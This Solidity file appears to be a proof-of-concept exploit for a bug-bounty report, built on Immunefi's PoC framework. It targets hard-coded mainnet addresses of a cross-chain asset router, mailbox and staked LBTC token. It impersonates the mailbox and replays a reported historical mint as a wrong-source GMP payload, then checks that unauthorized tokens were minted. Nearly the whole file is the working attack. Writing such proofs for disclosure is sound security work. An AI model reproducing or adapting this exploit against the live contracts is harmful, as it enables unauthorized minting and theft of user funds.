// SPDX-License-Identifier: UNLICENSED
pragma solidity =0.8.24;

import {PoC} from "@immunefi/PoC.sol";

interface IAssetRouterMainnet {
    struct Payload {
        bytes32 id;
        bytes32 msgPath;
        uint256 msgNonce;
        bytes32 msgSender;
        address msgRecipient;
        address msgDestinationCaller;
        bytes msgBody;
    }

    function handlePayload(Payload calldata payload) external returns (bytes memory);
}

interface IGMPBasculeMainnet {
    enum MintState {
        UNREPORTED,
        REPORTED,
        MINTED
    }

    struct Message {
        uint256 nonce;
        address recipient;
        address toToken;
        uint256 amount;
    }

    function mintHistory(
        bytes32 mintID
    ) external view returns (Message memory mintMsg, MintState status);
}

interface IMailboxMainnet {
    function getInboundMessagePath(bytes32 pathId) external view returns (bytes32);
}

interface ILBTCTokenMainnet {
    function balanceOf(address account) external view returns (uint256);
}

contract AttackContract is PoC {
    bytes4 internal constant GMP_V1_SELECTOR = 0xe288fb4a;
    bytes4 internal constant MINT_SELECTOR = 0x155b6b13;

    bytes32 internal constant BTC_STAKING_MODULE_ADDRESS =
        bytes32(uint256(0x0089e3e4e7a699d6f131d893aeef7ee143706ac23a));

    address internal constant ASSET_ROUTER =
        0x9eCe5fB1aB62d9075c4ec814b321e24D8EA021ac;
    address internal constant MAILBOX =
        0x964677F337d6528d659b1892D0045B8B27183fc0;
    address internal constant GMP_BASCULE_V1 =
        0xC3ecFE771564e3f28CFB7a9b203F4d10279338eD;
    address internal constant STAKED_LBTC =
        0x8236a87084f8B84306f72007F36F2618A5634494;

    bytes32 internal constant BASE_INBOUND_PATH =
        0xcd50e28493bee48d839718c74b719697bf7fab04530c5935035a93989295d731;
    bytes32 internal constant BASE_CHAIN_ID =
        0x0000000000000000000000000000000000000000000000000000000000002105;

    uint256 internal constant HISTORICAL_NONCE = 44;
    address internal constant HISTORICAL_RECIPIENT =
        0x555fcE4A88f9261B449A8078400e022c3a4fB706;
    uint256 internal constant HISTORICAL_AMOUNT = 0x11d88723;

    function initializeAttack() public {
        emit log_string(">>> Initialize attack");
        _executeAttack();
    }

    function _executeAttack() internal {
        emit log_string(">>> Execute wrong-source mint payload");

        require(
            IMailboxMainnet(MAILBOX).getInboundMessagePath(BASE_INBOUND_PATH) ==
                BASE_CHAIN_ID,
            "base path not enabled"
        );

        bytes32 mintID = keccak256(
            abi.encode(
                HISTORICAL_NONCE,
                block.chainid,
                HISTORICAL_RECIPIENT,
                STAKED_LBTC,
                HISTORICAL_AMOUNT
            )
        );
        (
            IGMPBasculeMainnet.Message memory reportedMint,
            IGMPBasculeMainnet.MintState statusBefore
        ) = IGMPBasculeMainnet(GMP_BASCULE_V1).mintHistory(mintID);

        require(
            statusBefore == IGMPBasculeMainnet.MintState.REPORTED,
            "historical mint not reported"
        );
        require(
            reportedMint.recipient == HISTORICAL_RECIPIENT,
            "reported recipient mismatch"
        );
        require(reportedMint.toToken == STAKED_LBTC, "reported token mismatch");
        require(reportedMint.amount == HISTORICAL_AMOUNT, "reported amount mismatch");

        bytes memory body = abi.encodePacked(
            MINT_SELECTOR,
            _addressToBytes32(STAKED_LBTC),
            _addressToBytes32(HISTORICAL_RECIPIENT),
            HISTORICAL_AMOUNT
        );
        bytes memory rawPayload = abi.encodeWithSelector(
            GMP_V1_SELECTOR,
            BASE_INBOUND_PATH,
            HISTORICAL_NONCE,
            BTC_STAKING_MODULE_ADDRESS,
            _addressToBytes32(ASSET_ROUTER),
            bytes32(0),
            body
        );

        IAssetRouterMainnet.Payload memory payload = IAssetRouterMainnet.Payload({
            id: sha256(rawPayload),
            msgPath: BASE_INBOUND_PATH,
            msgNonce: HISTORICAL_NONCE,
            msgSender: BTC_STAKING_MODULE_ADDRESS,
            msgRecipient: ASSET_ROUTER,
            msgDestinationCaller: address(0),
            msgBody: body
        });

        uint256 balanceBefore = ILBTCTokenMainnet(STAKED_LBTC).balanceOf(
            HISTORICAL_RECIPIENT
        );

        vm.prank(MAILBOX);
        IAssetRouterMainnet(ASSET_ROUTER).handlePayload(payload);

        uint256 balanceAfter = ILBTCTokenMainnet(STAKED_LBTC).balanceOf(
            HISTORICAL_RECIPIENT
        );
        require(
            balanceAfter == balanceBefore + HISTORICAL_AMOUNT,
            "wrong-source mint did not execute"
        );

        (, IGMPBasculeMainnet.MintState statusAfter) = IGMPBasculeMainnet(
            GMP_BASCULE_V1
        ).mintHistory(mintID);
        require(
            statusAfter == IGMPBasculeMainnet.MintState.MINTED,
            "mint slot not consumed"
        );

        emit log_string(">>> Complete attack");
        emit log_named_uint("staked LBTC minted", HISTORICAL_AMOUNT);
    }

    function _addressToBytes32(address addr) internal pure returns (bytes32) {
        return bytes32(uint256(uint160(addr)));
    }
}

